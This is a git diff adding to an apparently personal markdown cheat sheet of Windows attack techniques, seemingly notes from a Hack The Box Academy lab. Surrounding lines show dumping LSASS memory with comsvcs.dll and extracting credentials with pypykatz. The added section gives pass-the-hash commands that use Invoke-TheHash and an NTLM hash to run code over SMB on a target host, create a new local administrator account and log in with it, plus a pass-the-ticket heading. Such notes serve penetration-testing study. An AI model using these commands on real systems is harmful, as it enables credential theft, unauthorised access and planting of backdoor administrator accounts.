@@ -204,3 +204,26 @@ PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 
 ```
 ### pypykatz to extract creds
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/73175859-68c8-4c57-b017-179492da0fdb)
+
+## PTH from inside windows
+
+### Invoke the Hash smb
+
+Create a new user and login
+```
+Import-Module .\Invoke-TheHash.psd1
+```
+```
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+```
+Enter-PSSession -ComputerName 172.16.1.10 -Credential inlanefreight.htb\mark
+```
+
+## pass the ticket from in windows
+https://academy.hackthebox.com/module/147/section/1639
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/aebb2d7f-6f6b-493b-b01b-0de102e2729e)
+
+
+
